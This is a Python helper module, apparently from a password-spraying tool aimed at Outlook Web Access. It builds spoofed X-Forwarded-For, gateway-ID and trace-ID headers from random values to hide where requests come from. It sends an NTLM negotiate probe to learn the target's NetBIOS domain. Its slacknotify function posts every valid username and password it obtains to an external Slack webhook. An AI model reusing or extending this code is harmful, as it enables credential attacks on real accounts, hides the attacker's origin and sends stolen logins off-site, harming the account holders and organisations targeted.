import random, requests
from utils.ntlmdecode import ntlmdecode
import json
from utils.json_helper import read_json
from datetime import datetime

# We can set anything up here for easy parsing and access later, for the moment this only houses the slack webhook, can probably add discord and other platforms at a later date as parsing isn't an issue.

config_dict = read_json("config-vars")

def generate_ip():

    return ".".join(str(random.randint(0,255)) for _ in range(4))


def generate_id():

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(10))


def generate_trace_id():
    str = "Root=1-"
    first = "".join(random.choice("0123456789abcdef") for _ in range(8))
    second = "".join(random.choice("0123456789abcdef") for _ in range(24))
    return str + first + "-" + second


def generate_string(chars):

    return "".join(random.choice("0123456789abcdefghijklmnopqrstuvwxyz") for _ in range(chars))


def add_custom_headers(pluginargs, headers):

    if "custom-headers" in pluginargs.keys():
        for header in pluginargs["custom-headers"]:
            headers[header] = pluginargs["custom-headers"][header]

    return headers


def get_owa_domain(url, uri, useragent):
    # Stolen from https://github.com/byt3bl33d3r/SprayingToolkit who stole it from https://github.com/dafthack/MailSniper
    auth_header = {
        "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==",
        'User-Agent': useragent,
        "X-My-X-Forwarded-For" : generate_ip(),
        "x-amzn-apigateway-api-id" : generate_id(),
        "X-My-X-Amzn-Trace-Id" : generate_trace_id(),
    }

    r = requests.post("{url}{uri}".format(url=url,uri=uri), headers=auth_header, verify=False)
    if r.status_code == 401:
        ntlm_info = ntlmdecode(r.headers["x-amzn-Remapped-WWW-Authenticate"])
        return ntlm_info["NetBIOS_Domain_Name"]
    else:
        return "NOTFOUND"

# Function for posting username/password to slack channel
def slacknotify(username, password):
    now = datetime.now()
    webhook_url = config_dict["slack_webhook"]
    message = {"text": '```[Valid Credentials Obtained!]\nUser: ' + username + '\nPass: ' + password + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
    response = requests.post(
        webhook_url, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )

# Function for debug messages 
def slacklog(slacklog_msg):
    now = datetime.now()
    webhook_url = config_dict["slack_webhook"]
    message = {"text": '```[Log Entry]\n' + slacklog_msg + '\nDate: ' + now.strftime("%d-%m-%Y") + '\nTime: ' + now.strftime("%H:%M:%S") + '```'}
    response = requests.post(
        webhook_url, data=json.dumps(message),
        headers={'Content-Type': 'application/json'}
    )

# Colour Functions - ZephrFish
def prRed(skk): 
    return "\033[91m {}\033[00m" .format(skk)

def prGreen(skk): 
    return "\033[92m {}\033[00m" .format(skk)

def prYellow(skk): 
    return "\033[93m {}\033[00m" .format(skk)